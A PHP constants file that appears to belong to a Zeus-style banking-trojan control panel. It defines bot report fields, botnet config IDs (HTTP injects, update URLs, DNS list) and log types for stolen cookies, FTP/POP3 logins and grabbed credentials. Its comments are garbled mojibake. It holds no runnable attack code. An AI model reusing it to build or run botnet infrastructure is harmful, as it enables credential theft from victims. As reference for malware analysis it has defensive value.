<?php
/*
  ������ �������� ����� ��� C � PHP.
  ���� ����������� � make.php
  
  ����������: �.�. PHP ���������� ������ ��� int(��������), �� �� ���� �������� ����� ������������
              ���� ����� ��� ������� ��������.
*/

//ID ��� BinStorage ���������.
$_COMMON_DEFINE['SBCID_BOT_ID']                = '10001'; //ID ����.
$_COMMON_DEFINE['SBCID_BOTNET']                = '10002'; //������.
$_COMMON_DEFINE['SBCID_BOT_VERSION']           = '10003'; //������.
$_COMMON_DEFINE['SBCID_NET_LATENCY']           = '10005'; //��� ����.
$_COMMON_DEFINE['SBCID_TCPPORT_S1']            = '10006'; //���� ��� Socks.
$_COMMON_DEFINE['SBCID_PATH_SOURCE']           = '10007'; //�������� ���� �����.
$_COMMON_DEFINE['SBCID_PATH_DEST']             = '10008'; //�������� ���� �����.
$_COMMON_DEFINE['SBCID_TIME_SYSTEM']           = '10009'; //��������� �����.
$_COMMON_DEFINE['SBCID_TIME_TICK']             = '10010'; //GetTickCount.
$_COMMON_DEFINE['SBCID_TIME_LOCALBIAS']        = '10011'; //GMT ������.
$_COMMON_DEFINE['SBCID_OS_INFO']               = '10012'; //������ OS DWORD[5](major, minor, build_number, sp, (wSuiteMask + wProductType)).
$_COMMON_DEFINE['SBCID_LANGUAGE_ID']           = '10013'; //ID �����.
$_COMMON_DEFINE['SBCID_PROCESS_NAME']          = '10014'; //���� ��������.
$_COMMON_DEFINE['SBCID_PROCESS_USER']          = '10015'; //��� ������������ ��� ��������.
$_COMMON_DEFINE['SBCID_IPV4_ADDRESSES']        = '10016'; //������ IPv4.
$_COMMON_DEFINE['SBCID_IPV6_ADDRESSES']        = '10017'; //������ IPv6.
$_COMMON_DEFINE['SBCID_BOTLOG_TYPE']           = '10018'; //��� ����.
$_COMMON_DEFINE['SBCID_BOTLOG']                = '10019'; //���.

$_COMMON_DEFINE['SBCID_SCRIPT_ID']             = '11000'; //ID ����������� �������. MD5 ���.
$_COMMON_DEFINE['SBCID_SCRIPT_STATUS']         = '11001'; //������ ����������� �������.
$_COMMON_DEFINE['SBCID_SCRIPT_RESULT']         = '11002'; //�������� ����� �� ���������� �������. �� ����� 0xFFFF ��������.

$_COMMON_DEFINE['CFGID_LAST_VERSION']          = '20001'; //��������� ��������� ������ ����.
$_COMMON_DEFINE['CFGID_LAST_VERSION_URL']      = '20002'; //URL, ��� ����� ������� ��������� ������ ����.
$_COMMON_DEFINE['CFGID_URL_SERVER_0']          = '20003'; //URL ���������� �������.
$_COMMON_DEFINE['CFGID_URL_ADV_SERVERS']       = '20004'; //������-������ ��������� ������� ���������� �������.
$_COMMON_DEFINE['CFGID_HTTP_FILTER']           = '20005'; //������-������ ��� ���������� HTTP.
$_COMMON_DEFINE['CFGID_HTTP_POSTDATA_FILTER']  = '20006'; //������-������ ��� ���������� ����-������.
$_COMMON_DEFINE['CFGID_HTTP_INJECTS_LIST']     = '20007'; //������ HTTP-��������/������.
$_COMMON_DEFINE['CFGID_DNS_LIST']              = '20008'; //������ DNS.

//�������� ��� SBCID_BOTLOG_TYPE.
$_COMMON_DEFINE['BLT_UNKNOWN']                 = '0';   //���������� �����.

$_COMMON_DEFINE['BLT_COOKIES']                 = '1';   //������ ���������.
$_COMMON_DEFINE['BLT_FILE']                    = '2';   //����.

$_COMMON_DEFINE['BLT_HTTP_REQUEST']            = '11';  //HTTP-������.
$_COMMON_DEFINE['BLT_HTTPS_REQUEST']           = '12';  //HTTPS-������.

$_COMMON_DEFINE['BLT_LOGIN_FTP']               = '100'; //����� FTP.
$_COMMON_DEFINE['BLT_LOGIN_POP3']              = '101'; //����� POP3.

$_COMMON_DEFINE['BLT_GRABBED_UI']              = '200'; //������ ��������� �� User Interface.
$_COMMON_DEFINE['BLT_GRABBED_HTTP']            = '201'; //������ ��������� �� HTTP(s).
$_COMMON_DEFINE['BLT_GRABBED_WSOCKET']         = '202'; //������ ��������� �� WinSocket.
$_COMMON_DEFINE['BLT_GRABBED_FTPSOFTWARE']     = '203'; //������ ��������� �� FTP-��������.
$_COMMON_DEFINE['BLT_GRABBED_EMAILSOFTWARE']   = '204'; //������ ��������� �� E-mail-��������.
$_COMMON_DEFINE['BLT_GRABBED_OTHER']           = '299'; //������ ��������� �� ������ ����������.

//������.
$_COMMON_DEFINE['BOT_ID_MAX_CHARS']            = '100'; //������������ ������ ����� ����
$_COMMON_DEFINE['BOTNET_MAX_CHARS']            = '20';  //������������ ������ ����� �������
?>